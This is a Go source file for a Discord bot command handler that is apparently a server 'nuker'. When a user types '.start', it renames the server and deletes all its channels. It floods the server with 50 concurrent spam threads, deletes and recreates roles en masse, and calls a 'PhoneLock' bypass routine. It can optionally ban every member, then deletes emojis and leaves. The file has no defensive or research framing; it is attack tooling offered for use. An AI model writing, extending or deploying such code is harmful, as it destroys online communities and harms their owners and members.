package commands

import (
	"Dynamic/core/bypass"
	"Dynamic/core/creating"
	"Dynamic/core/removing"
	"Dynamic/core/requests"
	"Dynamic/core/start_end"
	"fmt"
	"os"
	"strconv"
	"sync"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

var (
	usedOnServers = make(map[string]bool)
	mutex         = &sync.Mutex{}

	queue = make(chan string, 100)
)

func Start(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup) {
	godotenv.Load()
	MASS_BAN := os.Getenv("MASS_BAN")
	MASSBAN, _ := strconv.ParseBool(MASS_BAN)

	if m.Author.ID == s.State.User.ID {
		return
	}

	guildID := m.GuildID

	queue <- m.GuildID
	requests.HandleQueue(s)

	if m.Content == ".start" {
		if usedOnServers[guildID] {
			s.ChannelMessageSend(m.ChannelID, "# Error!\n**`This command has been already used on this server.`**")
		} else {
			usedOnServers[guildID] = true

			s.ChannelMessageDelete(m.ChannelID, m.ID)

			mutex.Lock()
			defer mutex.Unlock()

			start_end.Logs(s, m)
			creating.GuildRename(s, m)

			wg.Add(1)
			go func() {
				defer wg.Done()
				channels, _ := s.GuildChannels(m.GuildID)
				creating.DeleteChannels(s, channels)
			}()
			wg.Wait()

			start_end.InviteCreate(s, m)

			for i := 0; i < 50; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					creating.TextSpam(s, m, wg)
				}()
			}
			wg.Wait()

			wg.Add(1)
			go func() {
				defer wg.Done()
				creating.DeleteRoles(s, m)
			}()
			wg.Wait()

			creating.EditRoles(s, m)
			bypass.PhoneLock(m)

			for i := 0; i < 50; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					creating.RolesSpam(s, m)
				}()
			}
			wg.Wait()

			if MASSBAN {
				wg.Add(1)
				go func() {
					defer wg.Done()
					removing.MemberBan(s, m)
				}()
				wg.Wait()
			} else {
				fmt.Println("MASS_BAN not set or true, no mass ban initiated.")
			}

			wg.Add(1)
			go func() {
				defer wg.Done()
				removing.EmojiDelete(s, m)
			}()
			wg.Wait()

			start_end.Leave(s, m)
		}
	} else {
		return
	}
}
